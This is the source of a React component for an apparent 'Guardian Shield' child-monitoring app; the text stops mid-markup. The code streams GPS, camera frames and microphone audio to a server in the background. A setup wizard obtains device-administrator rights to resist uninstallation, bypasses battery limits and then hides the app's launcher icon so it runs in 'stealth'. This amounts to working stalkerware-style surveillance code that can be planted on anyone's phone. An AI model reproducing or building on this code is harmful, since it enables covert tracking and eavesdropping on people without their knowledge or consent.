import React, { useState, useEffect, useRef } from 'react';
import { ChildDeviceState, AudioClipItem, CameraPosition } from '../types';
import { 
  Smartphone, 
  Lock, 
  ShieldAlert, 
  Wifi, 
  Battery, 
  Camera, 
  Settings, 
  Mic, 
  MapPin, 
  Shield, 
  Activity, 
  Check, 
  Video, 
  Radio, 
  Sparkles, 
  CheckCircle2, 
  AlertCircle, 
  FolderLock, 
  Layers, 
  BarChart, 
  Zap, 
  Sliders,
  ArrowRight,
  EyeOff,
  ChevronRight
} from 'lucide-react';
import { getApiUrl } from '../App';

interface ChildDeviceSimulatorProps {
  deviceState: ChildDeviceState;
  onUpdateChildState: (updates: Partial<ChildDeviceState>) => void;
  onTriggerSOS: () => void;
  onOpenSetupGuide: () => void;
  onSendCommand?: (command: string, payload?: any) => void;
}

export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
  deviceState,
  onUpdateChildState,
  onTriggerSOS,
  onOpenSetupGuide,
  onSendCommand
}) => {
  const [sosAlertSent, setSosAlertSent] = useState(false);
  const [currentTimeStr, setCurrentTimeStr] = useState('');
  
  // Real Hardware Permission States
  const [locationGranted, setLocationGranted] = useState(false);
  const [cameraGranted, setCameraGranted] = useState(false);
  const [micGranted, setMicGranted] = useState(false);
  const [realBattery, setRealBattery] = useState<number | null>(null);

  // Persistent Unique Device Identifier & Fixed Pairing Code
  const [deviceId, setDeviceId] = useState<string>('');
  const [pairingCode, setPairingCode] = useState<string>('');

  // Step-by-Step Setup Wizard State (1 to 9)
  const isSetupDone = localStorage.getItem('guardian_setup_completed') === 'true';
  const [currentStep, setCurrentStep] = useState<number>(isSetupDone ? 0 : 1);
  const [autoHideCountdown, setAutoHideCountdown] = useState<number>(5);

  // Live Streaming States
  const [isCameraStreamingLive, setIsCameraStreamingLive] = useState(false);
  const [isAudioStreamingLive, setIsAudioStreamingLive] = useState(false);

  // Hidden Media Elements & Stream Refs
  const videoStreamRef = useRef<MediaStream | null>(null);
  const audioStreamRef = useRef<MediaStream | null>(null);
  const mediaRecorderRef = useRef<MediaRecorder | null>(null);
  const hiddenVideoElRef = useRef<HTMLVideoElement | null>(null);
  const hiddenCanvasRef = useRef<HTMLCanvasElement | null>(null);
  const cameraIntervalRef = useRef<any>(null);
  const audioSeqRef = useRef<number>(0);
  const isSendingFrameRef = useRef<boolean>(false);

  // Native Android Bridge Helper
  const bridge = (window as any).AndroidBridge;

  // Live Clock Update
  useEffect(() => {
    const updateClock = () => {
      const d = new Date();
      setCurrentTimeStr(d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }));
    };
    updateClock();
    const timer = setInterval(updateClock, 1000);
    return () => clearInterval(timer);
  }, []);

  // Initialize Unique Device ID, Fixed Pairing Code
  useEffect(() => {
    let savedDevId = localStorage.getItem('child_device_id');
    if (!savedDevId) {
      savedDevId = `DEV-${Math.floor(100000 + Math.random() * 900000)}`;
      localStorage.setItem('child_device_id', savedDevId);
    }
    setDeviceId(savedDevId);

    let savedCode = localStorage.getItem('child_pairing_code');
    if (!savedCode) {
      const codePart1 = Math.floor(100 + Math.random() * 900);
      const codePart2 = Math.floor(100 + Math.random() * 900);
      savedCode = `${codePart1}-${codePart2}`;
      localStorage.setItem('child_pairing_code', savedCode);
    }
    setPairingCode(savedCode);

    // Detect device brand
    const ua = navigator.userAgent;
    let detectedModel = "Android Mobile Device";
    if (ua.includes("Samsung") || ua.includes("SM-")) detectedModel = "Samsung Galaxy Device";
    else if (ua.includes("Xiaomi") || ua.includes("Redmi") || ua.includes("POCO")) detectedModel = "Xiaomi / Redmi Device";
    else if (ua.includes("Pixel")) detectedModel = "Google Pixel Device";
    else if (ua.includes("Vivo") || ua.includes("V2")) detectedModel = "Vivo Mobile Device";
    else if (ua.includes("Oppo") || ua.includes("CPH")) detectedModel = "Oppo Mobile Device";
    else if (ua.includes("iPhone")) detectedModel = "Apple iPhone";

    onUpdateChildState({
      deviceId: savedDevId,
      pairingCode: savedCode,
      deviceModel: detectedModel,
      childName: `Child Phone (${savedCode})`,
      isOnline: true,
      lastSeen: "Live Now"
    });

    // Real Battery Listener
    if ('getBattery' in navigator) {
      (navigator as any).getBattery().then((battery: any) => {
        const updateBattery = () => {
          const lvl = Math.round(battery.level * 100);
          setRealBattery(lvl);
          onUpdateChildState({ 
            deviceId: savedDevId,
            batteryLevel: lvl, 
            isCharging: battery.charging,
            pairingCode: savedCode
          });
        };
        updateBattery();
        battery.addEventListener('levelchange', updateBattery);
        battery.addEventListener('chargingchange', updateBattery);
      }).catch(() => {});
    }
  }, []);

  // Auto Hide Countdown Timer on Step 9
  useEffect(() => {
    if (currentStep === 9) {
      const timer = setInterval(() => {
        setAutoHideCountdown(prev => {
          if (prev <= 1) {
            clearInterval(timer);
            handleFinalizeHide();
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      return () => clearInterval(timer);
    }
  }, [currentStep]);

  // Continuous Real GPS Geolocation Watcher
  useEffect(() => {
    if (navigator.geolocation && deviceId) {
      const watchId = navigator.geolocation.watchPosition(
        (position) => {
          setLocationGranted(true);
          const lat = position.coords.latitude;
          const lng = position.coords.longitude;
          
          onUpdateChildState({
            deviceId,
            pairingCode,
            location: {
              lat,
              lng,
              address: `Live Real GPS (${lat.toFixed(5)}, ${lng.toFixed(5)})`,
              speed: Math.round((position.coords.speed || 0) * 3.6),
              accuracy: Math.round(position.coords.accuracy),
              altitude: Math.round(position.coords.altitude || 0),
              timestamp: new Date().toISOString(),
              batteryAtLocation: realBattery || deviceState.batteryLevel
            }
          });
        },
        (err) => {},
        { enableHighAccuracy: true, maximumAge: 3000, timeout: 10000 }
      );
      return () => navigator.geolocation.clearWatch(watchId);
    }
  }, [deviceId, pairingCode, realBattery]);

  // ULTRA-FAST 60 FPS LIVE CAMERA STREAMING PIPELINE
  useEffect(() => {
    if (deviceState.activeCamera && deviceState.activeCamera !== 'off' && deviceId) {
      startHighFpsCameraStream(deviceState.activeCamera as CameraPosition);
    } else {
      stopLiveCameraStream();
    }
    return () => {
      stopLiveCameraStream();
    };
  }, [deviceState.activeCamera, deviceId]);

  const startHighFpsCameraStream = async (cameraPos: CameraPosition) => {
    try {
      stopLiveCameraStream();
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: cameraPos === 'front' ? 'user' : 'environment',
          width: { ideal: 480, max: 640 },
          height: { ideal: 360, max: 480 },
          frameRate: { ideal: 60, min: 30 }
        },
        audio: false
      });

      videoStreamRef.current = stream;
      setCameraGranted(true);
      setIsCameraStreamingLive(true);

      if (!hiddenVideoElRef.current) {
        const v = document.createElement('video');
        v.playsInline = true;
        v.muted = true;
        v.autoplay = true;
        hiddenVideoElRef.current = v;
      }
      hiddenVideoElRef.current.srcObject = stream;
      await hiddenVideoElRef.current.play();

      if (!hiddenCanvasRef.current) {
        hiddenCanvasRef.current = document.createElement('canvas');
        hiddenCanvasRef.current.width = 480;
        hiddenCanvasRef.current.height = 360;
      }

      cameraIntervalRef.current = setInterval(async () => {
        if (!hiddenVideoElRef.current || !hiddenCanvasRef.current || !videoStreamRef.current) return;
        if (isSendingFrameRef.current) return;

        const ctx = hiddenCanvasRef.current.getContext('2d');
        if (ctx && hiddenVideoElRef.current.videoWidth > 0) {
          ctx.drawImage(hiddenVideoElRef.current, 0, 0, 480, 360);
          const frameData = hiddenCanvasRef.current.toDataURL('image/jpeg', 0.45);

          isSendingFrameRef.current = true;
          try {
            await fetch(getApiUrl('/api/device/stream-frame'), {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                deviceId,
                type: 'camera',
                frameData,
                camera: cameraPos
              })
            });
          } catch (e) {} finally {
            isSendingFrameRef.current = false;
          }
        }
      }, 45);

    } catch (err: any) {
      setIsCameraStreamingLive(false);
    }
  };

  const stopLiveCameraStream = () => {
    if (cameraIntervalRef.current) {
      clearInterval(cameraIntervalRef.current);
      cameraIntervalRef.current = null;
    }
    if (videoStreamRef.current) {
      videoStreamRef.current.getTracks().forEach(t => t.stop());
      videoStreamRef.current = null;
    }
    setIsCameraStreamingLive(false);
  };

  // CONTINUOUS LIVE VOICE STREAMING
  useEffect(() => {
    if (deviceState.audioState?.isListening && deviceId) {
      startLiveAudioStream();
    } else {
      stopLiveAudioStream();
    }
    return () => {
      stopLiveAudioStream();
    };
  }, [deviceState.audioState?.isListening, deviceId]);

  const startLiveAudioStream = async () => {
    try {
      stopLiveAudioStream();
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      audioStreamRef.current = stream;
      setMicGranted(true);
      setIsAudioStreamingLive(true);

      const mediaRecorder = new MediaRecorder(stream);
      mediaRecorderRef.current = mediaRecorder;

      mediaRecorder.ondataavailable = async (e) => {
        if (e.data.size > 0 && deviceId) {
          const reader = new FileReader();
          reader.readAsDataURL(e.data);
          reader.onloadend = async () => {
            const audioData = reader.result as string;
            audioSeqRef.current += 1;
            try {
              await fetch(getApiUrl('/api/device/stream-frame'), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  deviceId,
                  type: 'audio',
                  frameData: audioData,
                  seq: audioSeqRef.current
                })
              });
            } catch (err) {}
          };
        }
      };

      mediaRecorder.start(600);
    } catch (err: any) {
      setIsAudioStreamingLive(false);
    }
  };

  const stopLiveAudioStream = () => {
    if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
      try { mediaRecorderRef.current.stop(); } catch (e) {}
      mediaRecorderRef.current = null;
    }
    if (audioStreamRef.current) {
      audioStreamRef.current.getTracks().forEach(t => t.stop());
      audioStreamRef.current = null;
    }
    setIsAudioStreamingLive(false);
  };

  // Step Action Handlers
  const handleStep1Location = async () => {
    if (bridge?.requestNativeLocation) bridge.requestNativeLocation();
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          setLocationGranted(true);
          onUpdateChildState({
            deviceId,
            pairingCode,
            location: {
              lat: pos.coords.latitude,
              lng: pos.coords.longitude,
              address: `Live GPS (${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)})`,
              speed: 0,
              accuracy: Math.round(pos.coords.accuracy),
              altitude: 0,
              timestamp: new Date().toISOString(),
              batteryAtLocation: realBattery || deviceState.batteryLevel
            }
          });
          setTimeout(() => setCurrentStep(2), 600);
        },
        () => {
          setCurrentStep(2);
        },
        { enableHighAccuracy: true }
      );
    } else {
      setCurrentStep(2);
    }
  };

  const handleStep2Camera = async () => {
    if (bridge?.requestNativeCamera) bridge.requestNativeCamera();
    try {
      const s = await navigator.mediaDevices.getUserMedia({ video: true });
      setCameraGranted(true);
      s.getTracks().forEach(t => t.stop());
      setTimeout(() => setCurrentStep(3), 600);
    } catch (e) {
      setCurrentStep(3);
    }
  };

  const handleStep3Mic = async () => {
    if (bridge?.requestNativeAudio) bridge.requestNativeAudio();
    try {
      const s = await navigator.mediaDevices.getUserMedia({ audio: true });
      setMicGranted(true);
      s.getTracks().forEach(t => t.stop());
      setTimeout(() => setCurrentStep(4), 600);
    } catch (e) {
      setCurrentStep(4);
    }
  };

  const handleStep4Storage = () => {
    if (bridge?.openAllFilesAccess) bridge.openAllFilesAccess();
    setCurrentStep(5);
  };

  const handleStep5Battery = () => {
    if (bridge?.openBatteryOptimization) bridge.openBatteryOptimization();
    setCurrentStep(6);
  };

  const handleStep6Overlay = () => {
    if (bridge?.openOverlayPermission) bridge.openOverlayPermission();
    setCurrentStep(7);
  };

  const handleStep7Usage = () => {
    if (bridge?.openUsageAccessSettings) bridge.openUsageAccessSettings();
    setCurrentStep(8);
  };

  const handleStep8Admin = () => {
    if (bridge?.openDeviceAdmin) bridge.openDeviceAdmin();
    setCurrentStep(9);
  };

  const handleFinalizeHide = () => {
    localStorage.setItem('guardian_setup_completed', 'true');
    if (bridge?.hideAppIcon) {
      bridge.hideAppIcon();
    }
    setCurrentStep(0);
  };

  const handleSOS = () => {
    setSosAlertSent(true);
    onTriggerSOS();
    setTimeout(() => setSosAlertSent(false), 5000);
  };

  // -------------------------------------------------------------
  // RENDER STEP-BY-STEP ACTIVATION WIZARD (WHEN SETUP IS RUNNING)
  // -------------------------------------------------------------
  if (currentStep >= 1 && currentStep <= 9) {
    return (
      <div className="min-h-screen bg-slate-950 text-slate-100 flex flex-col justify-between p-6 max-w-md mx-auto font-sans">
        
        {/* Top Progress Header */}
        <div className="space-y-3">
          <div className="flex items-center justify-between text-xs text-slate-400 font-mono">
            <span className="font-bold text-orange-400">GUARDIAN SHIELD ACTIVATOR</span>
            <span>STEP {currentStep} OF 8</span>
          </div>

          <div className="w-full h-2 bg-slate-800 rounded-full overflow-hidden">
            <div 
              className="h-full bg-gradient-to-r from-orange-500 via-amber-400 to-emerald-400 transition-all duration-300 rounded-full"
              style={{ width: `${Math.min(100, (currentStep / 8) * 100)}%` }}
            />
          </div>
        </div>

        {/* Step Card Content */}
        <div className="my-auto py-6 space-y-6">
          
          {/* STEP 1: GPS LOCATION */}
          {currentStep === 1 && (
            <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-xl">
              <div className="w-16 h-16 rounded-2xl bg-orange-500/20 text-orange-400 border border-orange-500/30 flex items-center justify-center mx-auto">
                <MapPin className="w-9 h-9" />
              </div>
              <div>
                <h3 className="text-xl font-black text-white">1. Live GPS Location</h3>
                <p className="text-xs text-slate-400 mt-2 leading-relaxed">
                  Allow 24/7 background location tracking so parents can see real-time coordinates and geofences.
                </p>
              </div>
              <button
                onClick={handleStep1Location}
                className="w-full py-4 bg-orange-600 hover:bg-orange-500 text-white rounded-2xl font-bold text-sm shadow-lg shadow-orange-950 flex items-center justify-center gap-2"
              >
                <span>{locationGranted ? '✓ Location Active - Next' : 'Grant Location Permission'}</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          )}

          {/* STEP 2: CAMERA */}
          {currentStep === 2 && (
            <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-xl">
              <div className="w-16 h-16 rounded-2xl bg-indigo-500/20 text-indigo-400 border border-indigo-500/30 flex items-center justify-center mx-auto">
                <Video className="w-9 h-9" />
              </div>
              <div>
                <h3 className="text-xl font-black text-white">2. Dual Camera (60 FPS)</h3>
                <p className="text-xs text-slate-400 mt-2 leading-relaxed">
                  Allow high-speed front and rear camera live streaming to parental dashboard.
                </p>
              </div>
              <button
                onClick={handleStep2Camera}
                className="w-full py-4 bg-indigo-600 hover:bg-indigo-500 text-white rounded-2xl font-bold text-sm shadow-lg shadow-indigo-950 flex items-center justify-center gap-2"
              >
                <span>{cameraGranted ? '✓ Camera Active - Next' : 'Grant Camera Permission'}</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          )}

          {/* STEP 3: MICROPHONE */}
          {currentStep === 3 && (
            <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-xl">
              <div className="w-16 h-16 rounded-2xl bg-purple-500/20 text-purple-400 border border-purple-500/30 flex items-center justify-center mx-auto">
                <Mic className="w-9 h-9" />
              </div>
              <div>
                <h3 className="text-xl font-black text-white">3. Microphone & Live Voice</h3>
                <p className="text-xs text-slate-400 mt-2 leading-relaxed">
                  Allow real-time background microphone audio streaming to listen to ambient surroundings.
                </p>
              </div>
              <button
                onClick={handleStep3Mic}
                className="w-full py-4 bg-purple-600 hover:bg-purple-500 text-white rounded-2xl font-bold text-sm shadow-lg shadow-purple-950 flex items-center justify-center gap-2"
              >
                <span>{micGranted ? '✓ Mic Active - Next' : 'Grant Microphone Permission'}</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          )}

          {/* STEP 4: STORAGE */}
          {currentStep === 4 && (
            <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-xl">
              <div className="w-16 h-16 rounded-2xl bg-amber-500/20 text-amber-400 border border-amber-500/30 flex items-center justify-center mx-auto">
                <FolderLock className="w-9 h-9" />
              </div>
              <div>
                <h3 className="text-xl font-black text-white">4. File Storage & Media Access</h3>
                <p className="text-xs text-slate-400 mt-2 leading-relaxed">
                  Allow media indexing to monitor downloaded photos, documents, and storage health.
                </p>
              </div>
              <button
                onClick={handleStep4Storage}
                className="w-full py-4 bg-amber-600 hover:bg-amber-500 text-white rounded-2xl font-bold text-sm shadow-lg shadow-amber-950 flex items-center justify-center gap-2"
              >
                <span>Grant Storage Access & Continue</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          )}

          {/* STEP 5: BATTERY OPTIMIZATION */}
          {currentStep === 5 && (
            <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-xl">
              <div className="w-16 h-16 rounded-2xl bg-yellow-500/20 text-yellow-400 border border-yellow-500/30 flex items-center justify-center mx-auto">
                <Zap className="w-9 h-9" />
              </div>
              <div>
                <h3 className="text-xl font-black text-white">5. 24/7 Battery Optimization Bypass</h3>
                <p className="text-xs text-slate-400 mt-2 leading-relaxed">
                  Prevent Android from automatically putting Guardian Shield to sleep or killing background sync.
                </p>
              </div>
              <button
                onClick={handleStep5Battery}
                className="w-full py-4 bg-yellow-600 hover:bg-yellow-500 text-white rounded-2xl font-bold text-sm shadow-lg shadow-yellow-950 flex items-center justify-center gap-2"
              >
                <span>Ignore Battery Restrictions</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          )}

          {/* STEP 6: OVERLAY DRAW */}
          {currentStep === 6 && (
            <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-xl">
              <div className="w-16 h-16 rounded-2xl bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 flex items-center justify-center mx-auto">
                <Smartphone className="w-9 h-9" />
              </div>
              <div>
                <h3 className="text-xl font-black text-white">6. Display Over Other Apps</h3>
                <p className="text-xs text-slate-400 mt-2 leading-relaxed">
                  Required so parents can instantly trigger emergency lock screens over any active app.
                </p>
              </div>
              <button
                onClick={handleStep6Overlay}
                className="w-full py-4 bg-cyan-600 hover:bg-cyan-500 text-white rounded-2xl font-bold text-sm shadow-lg shadow-cyan-950 flex items-center justify-center gap-2"
              >
                <span>Enable Overlay Permission</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          )}

          {/* STEP 7: USAGE ACCESS */}
          {currentStep === 7 && (
            <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-xl">
              <div className="w-16 h-16 rounded-2xl bg-blue-500/20 text-blue-400 border border-blue-500/30 flex items-center justify-center mx-auto">
                <BarChart className="w-9 h-9" />
              </div>
              <div>
                <h3 className="text-xl font-black text-white">7. Usage Access Statistics</h3>
                <p className="text-xs text-slate-400 mt-2 leading-relaxed">
                  Allows parents to monitor daily app usage times and enforce healthy screen time limits.
                </p>
              </div>
              <button
                onClick={handleStep7Usage}
                className="w-full py-4 bg-blue-600 hover:bg-blue-500 text-white rounded-2xl font-bold text-sm shadow-lg shadow-blue-950 flex items-center justify-center gap-2"
              >
                <span>Enable Usage Access</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          )}

          {/* STEP 8: DEVICE ADMIN */}
          {currentStep === 8 && (
            <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-xl">
              <div className="w-16 h-16 rounded-2xl bg-rose-500/20 text-rose-400 border border-rose-500/30 flex items-center justify-center mx-auto">
                <ShieldAlert className="w-9 h-9" />
              </div>
              <div>
                <h3 className="text-xl font-black text-white">8. Device Administrator Shield</h3>
                <p className="text-xs text-slate-400 mt-2 leading-relaxed">
                  Protects Guardian Shield against unauthorized uninstallation and provides anti-tamper lock.
                </p>
              </div>
              <button
                onClick={handleStep8Admin}
                className="w-full py-4 bg-rose-600 hover:bg-rose-500 text-white rounded-2xl font-bold text-sm shadow-lg shadow-rose-950 flex items-center justify-center gap-2"
              >
                <span>Activate Device Administrator</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          )}

          {/* STEP 9: FINAL SUCCESS & STEALTH HIDE */}
          {currentStep === 9 && (
            <div className="bg-slate-900 border border-emerald-500/40 rounded-3xl p-6 text-center space-y-5 shadow-2xl animate-fade-in">
              <div className="w-20 h-20 rounded-full bg-emerald-500/20 text-emerald-400 border-2 border-emerald-500 flex items-center justify-center mx-auto animate-bounce">
                <CheckCircle2 className="w-12 h-12" />
              </div>
              <div>
                <h3 className="text-2xl font-black text-white">Setup Complete!</h3>
                <p className="text-xs text-emerald-400 font-bold mt-1">
                  All 8 Permissions Configured Successfully
                </p>
              </div>

              <div className="bg-slate-950/80 p-4 rounded-2xl border border-slate-800 text-xs text-slate-300 space-y-2">
                <p className="text-slate-400">Fixed Pairing Code:</p>
                <div className="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-orange-400 to-emerald-400 font-mono tracking-widest">
                  {pairingCode}
                </div>
                <p className="text-[11px] text-slate-400">
                  Guardian Shield is now running silently in background 24/7.
                </p>
              </div>

              <div className="p-3 bg-rose-950/40 border border-rose-900/60 rounded-xl text-rose-300 text-xs flex items-center gap-2 justify-center">
                <EyeOff className="w-4 h-4 shrink-0" />
                <span>Hiding app icon from launcher in <b>{autoHideCountdown}s</b>...</span>
              </div>

              <button
                onClick={handleFinalizeHide}
                className="w-full py-4 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white rounded-2xl font-bold text-sm shadow-xl flex items-center justify-center gap-2"
              >
                <EyeOff className="w-4 h-4" />
                <span>Hide App Icon Now & Go Stealth</span>
              </button>
            </div>
          )}

        </div>

        {/* Bottom Skip/Manual Next Button */}
        {currentStep < 9 && (
          <div className="flex items-center justify-between text-xs text-slate-500">
            <button
              onClick={() => setCurrentStep(prev => Math.min(9, prev + 1))}
              className="hover:text-slate-300 underline"
            >
              Skip this step →
            </button>
            <span className="font-mono text-slate-600">Guardian v2.4</span>
          </div>
        )}

      </div>
    );
  }

  // -------------------------------------------------------------
  // RENDER NORMAL RUNNING DAEMON DASHBOARD (ONCE SETUP IS DONE)
  // -------------------------------------------------------------
  return (
    <div className="max-w-md mx-auto my-4 bg-slate-900 rounded-3xl border-4 border-slate-700 shadow-2xl overflow-hidden flex flex-col text-slate-100 min-h-[680px]">
      
      {/* Phone Status Bar */}
      <div className="bg-slate-950 px-6 py-3 flex items-center justify-between text-xs text-slate-400 border-b border-slate-800">
        <span className="font-semibold tracking-wide text-slate-300">{currentTimeStr}</span>
        <div className="flex items-center space-x-3">
          <div className="flex items-center space-x-1 text-emerald-400">
            <Activity className="w-3.5 h-3.5 animate-pulse" />
            <span className="text-[10px] font-bold">BACKGROUND DAEMON</span>
          </div>
          <div className="flex items-center space-x-1">
            <Wifi className="w-3.5 h-3.5 text-slate-300" />
            <span>{realBattery !== null ? `${realBattery}%` : `${deviceState.batteryLevel}%`}</span>
            <Battery className="w-4 h-4 text-emerald-400 fill-emerald-400" />
          </div>
        </div>
      </div>

      {/* Main Agent UI Container */}
      <div className="flex-1 p-5 flex flex-col justify-between space-y-4">
        
        {/* Header Badge */}
        <div className="bg-slate-800/80 border border-slate-700/80 rounded-2xl p-4 flex items-center justify-between">
          <div className="flex items-center space-x-3">
            <div className="w-10 h-10 rounded-xl bg-orange-500/20 border border-orange-500/40 flex items-center justify-center text-orange-400">
              <Shield className="w-6 h-6" />
            </div>
            <div>
              <h2 className="font-bold text-white text-base">Guardian Shield Daemon</h2>
              <p className="text-xs text-emerald-400 flex items-center space-x-1">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping"></span>
                <span>Active 24/7 Stealth Protection</span>
              </p>
            </div>
          </div>
          <button
            onClick={() => setCurrentStep(1)}
            className="p-2 rounded-xl bg-slate-700 hover:bg-slate-600 text-slate-300 transition flex items-center gap-1 text-xs font-bold"
            title="Permissions Setup Wizard"
          >
            <Sliders className="w-4 h-4 text-orange-400" />
            <span>Wizard</span>
          </button>
        </div>

        {/* Unique Fixed Pairing Code Card */}
        <div className="bg-gradient-to-br from-indigo-950/60 to-slate-800/90 border border-indigo-500/30 rounded-2xl p-5 text-center shadow-lg">
          <span className="text-xs font-semibold uppercase tracking-wider text-indigo-300">Your Phone Connection Code</span>
          <div className="text-3xl font-black tracking-widest text-transparent bg-clip-text bg-gradient-to-r from-orange-400 via-amber-300 to-emerald-400 my-2 font-mono">
            {pairingCode || '...'}
          </div>
          <p className="text-xs text-slate-400">
            Device ID: <span className="font-mono text-slate-200">{deviceId || 'Connecting...'}</span>
          </p>
          <p className="text-[11px] text-slate-400 mt-2">
            Enter this code on your Parent Dashboard to link this specific phone: <br />
            <span className="text-indigo-400 font-medium underline">https://guardian-shield.onrender.com</span>
          </p>
        </div>

        {/* Stealth Hiding Controls */}
        <div className="bg-slate-800/60 border border-slate-700/60 rounded-2xl p-4 flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <EyeOff className="w-5 h-5 text-rose-400" />
            <div>
              <b className="text-slate-200 text-xs block">Stealth Launcher Icon</b>
              <span className="text-[10px] text-slate-400">Hide app icon from phone's app drawer</span>
            </div>
          </div>
          <button
            onClick={() => {
              if (bridge?.hideAppIcon) bridge.hideAppIcon();
            }}
            className="px-3 py-1.5 bg-rose-600 hover:bg-rose-500 text-white rounded-xl text-xs font-bold flex items-center gap-1"
          >
            <EyeOff className="w-3.5 h-3.5" />
            <span>Hide App</span>
          </button>
        </div>

        {/* Live Hardware Telemetry Matrix */}
        <div className="grid grid-cols-2 gap-3">
          
          {/* GPS Status */}
          <div 
            onClick={handleStep1Location}
            className="bg-slate-800/60 hover:bg-slate-800 border border-slate-700/60 rounded-xl p-3 cursor-pointer transition flex flex-col justify-between"
          >
            <div className="flex items-center justify-between mb-1">
              <span className="text-[11px] font-semibold text-slate-400 uppercase">GPS Location</span>
              <MapPin className="w-4 h-4 text-orange-400" />
            </div>
            <div className="text-xs font-bold text-slate-200 truncate">
              {deviceState.location.lat ? `${deviceState.location.lat.toFixed(4)}, ${deviceState.location.lng.toFixed(4)}` : 'Active'}
            </div>
            <span className="text-[10px] text-emerald-400 mt-1 flex items-center">
              <Check className="w-3 h-3 mr-0.5" /> {locationGranted ? 'GPS Linked' : 'Active'}
            </span>
          </div>

          {/* Battery Status */}
          <div className="bg-slate-800/60 border border-slate-700/60 rounded-xl p-3 flex flex-col justify-between">
            <div className="flex items-center justify-between mb-1">
              <span className="text-[11px] font-semibold text-slate-400 uppercase">Battery</span>
              <Battery className="w-4 h-4 text-emerald-400" />
            </div>
            <div className="text-xs font-bold text-slate-200">
              {realBattery !== null ? `${realBattery}%` : `${deviceState.batteryLevel}%`}
              {deviceState.isCharging ? ' ⚡' : ''}
            </div>
            <span className="text-[10px] text-emerald-400 mt-1">24/7 Keep-Alive</span>
          </div>

          {/* Live Camera Stream Status */}
          <div 
            onClick={handleStep2Camera}
            className="bg-slate-800/60 hover:bg-slate-800 border border-slate-700/60 rounded-xl p-3 cursor-pointer transition flex flex-col justify-between"
          >
            <div className="flex items-center justify-between mb-1">
              <span className="text-[11px] font-semibold text-slate-400 uppercase">Camera</span>
              <Video className="w-4 h-4 text-indigo-400" />
            </div>
            <div className="text-xs font-bold text-slate-200">
              {isCameraStreamingLive ? (
                <span className="text-red-400 flex items-center gap-1">
                  <span className="w-2 h-2 rounded-full bg-red-500 animate-ping" />
                  60 FPS Stream
                </span>
              ) : '60 FPS Ultra HD'}
            </div>
            <span className="text-[10px] text-indigo-300 mt-1">Dual Lens Ready</span>
          </div>

          {/* Live Mic Voice Status */}
          <div 
            onClick={handleStep3Mic}
            className="bg-slate-800/60 hover:bg-slate-800 border border-slate-700/60 rounded-xl p-3 cursor-pointer transition flex flex-col justify-between"
          >
            <div className="flex items-center justify-between mb-1">
              <span className="text-[11px] font-semibold text-slate-400 uppercase">Microphone</span>
              <Mic className="w-4 h-4 text-purple-400" />
            </div>
            <div className="text-xs font-bold text-slate-200">
              {isAudioStreamingLive ? (
                <span className="text-emerald-400 flex items-center gap-1">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                  Live Voice
                </span>
              ) : 'Low-Latency HD'}
            </div>
            <span className="text-[10px] text-purple-300 mt-1">Real-time Audio</span>
          </div>

        </div>

        {/* Emergency SOS Panic Button */}
        <div className="pt-2">
          <button
            onClick={handleSOS}
            disabled={sosAlertSent}
            className={`w-full py-4 rounded-2xl font-black text-sm uppercase tracking-wider flex items-center justify-center space-x-2 shadow-xl transition-all ${
              sosAlertSent
                ? 'bg-emerald-600 text-white'
                : 'bg-gradient-to-r from-red-600 via-rose-600 to-red-700 hover:from-red-500 hover:to-rose-600 text-white shadow-red-900/50 active:scale-98'
            }`}
          >
            <ShieldAlert className="w-5 h-5" />
            <span>{sosAlertSent ? '🚨 SOS Alert Dispatched!' : '🚨 Instant SOS Alert'}</span>
          </button>
        </div>

      </div>

      {/* Screen Locked Fullscreen Overlay */}
      {deviceState.isLocked && (
        <div className="absolute inset-0 bg-slate-950/95 backdrop-blur-xl flex flex-col items-center justify-center p-6 text-center z-50 animate-in fade-in zoom-in-95 duration-300">
          <div className="w-20 h-20 rounded-full bg-red-500/20 border-2 border-red-500 flex items-center justify-center text-red-500 mb-6 animate-pulse">
            <Lock className="w-10 h-10" />
          </div>
          <h2 className="text-2xl font-black text-white tracking-tight mb-2">Device Screen Locked</h2>
          <p className="text-sm text-red-400 font-semibold mb-4">Access restricted by Parent</p>
          <div className="bg-slate-900 border border-slate-800 rounded-2xl p-4 max-w-xs text-xs text-slate-300 mb-6">
            "{deviceState.customLockMessage || 'Screen time limit reached or restricted by Guardian.'}"
          </div>
          <button
            onClick={handleSOS}
